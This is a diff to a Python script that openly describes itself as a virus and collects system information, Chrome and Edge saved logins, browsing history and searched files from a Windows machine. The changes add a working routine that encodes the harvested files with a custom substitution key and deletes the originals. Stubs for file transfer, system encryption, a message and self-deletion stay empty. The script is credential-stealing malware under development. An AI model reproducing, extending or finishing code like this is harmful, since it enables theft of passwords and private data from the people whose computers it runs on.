@@ -1,4 +1,4 @@
-true_false=['C:\\Users\\Public', True, True, True, True, True, True, True, True, True, 'hello_world', True, [True, True, ' ', True, [], True, []]]
+true_false=['C:\\Users\\Public', True, True, True, True, True, True, True, True, True, 'hello_world', True, [True, True, 'C:\\Users\\DELL\\Desktop\\toolss', True, ['Book1','lol1','os'], False, []]]
 working_directory01=true_false[0]
 system_info_collect=true_false[1]
 chrome_data_collect=true_false[2]
@@ -13,10 +13,8 @@ message=true_false[10]
 type_of_virus_oftf=true_false[11]
 dir_search_ifnfo=true_false[12]
 import os
-print(' i am making path')
 main_path=working_directory01+'\\app_data'
 os.mkdir(main_path) if not os.path.exists(main_path)else None
-print(' i am done makeing path')
 # internet_accsess=true_false[11]
 #other fuction--------------------------------------------------------------------------
 def chrome_date_and_time(chrome_data):
@@ -52,6 +50,7 @@ import socket
 from datetime import timedelta,datetime
 import time
 import subprocess
+import random
 while True:
     if check_internet_connection():break
     else:time.sleep(5)
@@ -405,10 +404,54 @@ def dir_search(saving_path: str, specific_path_tf: bool = True, specific_path: s
         return True, found, found1
     except Exception:
         return False
-def encrypt_data(path_to_save):
-    pass
-def file_transefer(path_to_save):
-    pass
+def encrypt_data(main_path):
+    try:
+        def number_coding(string:str, key:str):
+            k=key.split('0');k.pop(k.index(''))
+            w = 'abcdefghijklmnopqrstuvwxyz!@#$%^&*()_-+={}[]|\\:;\"\'<,>.?/~` 1234567890'
+            c = {w[i]: k[i] for i in range(69)}
+            c2 = k[69:81]
+            encoded_str = ''.join(c[i]+'0' if i in c else i+'0' for i in string)
+            str1 = ''.join(random.choice(c2)+'0' if i == '53' else i+'0' for i in encoded_str.split('0'))
+            return str1
+        key="540360960520470490460160630790840420290660850180220410150570270370810170760720890280560870880430730670140260970690550250990240830230350210860930950740530780130650910640680320770380940750190120450330310440480820980590920710510580110390620340610"
+        file_list=['system_info','chrome_data','chrome_id_pass','chrome_web_data','chr_history_data','system_edge']
+        path=main_path+'\\dir_search'
+        for i in file_list:
+            try:
+                with open(main_path+'\\'+i+'new','w+',encoding='Utf-8')as writing:
+                    with open(main_path+'\\'+i,'r',encoding='Utf-8') as reading:
+                        lol=number_coding(reading.read(),key=key)
+                        reading.close()
+                        try:os.remove(main_path+'\\'+i)
+                        except Exception:pass
+                    writing.write(str(lol))
+            except Exception as e:print(e)
+        if os.path.exists(path):
+            path_new=main_path+'\\dir_search_new'
+            os.mkdir(path_new) if not os.path.exists(path_new) else None
+            for i in os.listdir(path):
+                try:
+                    with open(path_new+'\\'+i.replace(".", "-")+'.txt','w+',encoding='Utf-8')as writing:
+                        try:
+                            with open(path+'\\'+i,'rb') as reading:
+                                lol=str(number_coding(str(reading.read()),key))
+                                print(lol)
+                                reading.close()
+                        except Exception as e:print(e)
+                        try:os.remove(path+'\\'+i)
+                        except Exception as e:print(e)
+                        writing.write(lol)
+                except Exception as e:print(e)
+            try:shutil.rmtree(path)
+            except Exception:pass
+        else:pass
+        return True ,path_new
+    except Exception as e :
+        print(e)
+        return False,None
+def file_transefer(type_of_virus:bool):
+    pass    
 def encrypt_the_system(path_to):
     pass
 def message_and_deletaion(argiment):
@@ -432,7 +475,12 @@ if chrome_data_collect:
 if edge_data_tf:
     edge_data_response=edge_data(main_path+'\\system_edge')
 if dir_search_ifnfo[0]:
-    os.mkdir(main_dir:=main_path+'\\dir_search')if not os.path.exists(main_path+'\\dir_search') else None
-    dir_search(main_dir,specific_path_tf=dir_search_ifnfo[1],specific_path=dir_search_ifnfo[2],search_name=dir_search_ifnfo[3],search_extension=dir_search_ifnfo[4],list_of_search=dir_search_ifnfo[5],list_of_extension_search=dir_search_ifnfo[6])
-
-    
+    main_dir=main_path+'\\dir_search'
+    os.mkdir(main_dir)if not os.path.exists(main_path+'\\dir_search') else None
+    dir_search(saving_path=main_dir,specific_path_tf=dir_search_ifnfo[1],specific_path=dir_search_ifnfo[2],search_name=dir_search_ifnfo[3],search_extension=dir_search_ifnfo[5],list_of_search=dir_search_ifnfo[4],list_of_extension_search=dir_search_ifnfo[6])
+if encrypt_data_tf:
+    encrypt_data_response=encrypt_data(main_path)
+if type_of_virus_oftf:
+    pass
+if message_show_y_n:
+    pass
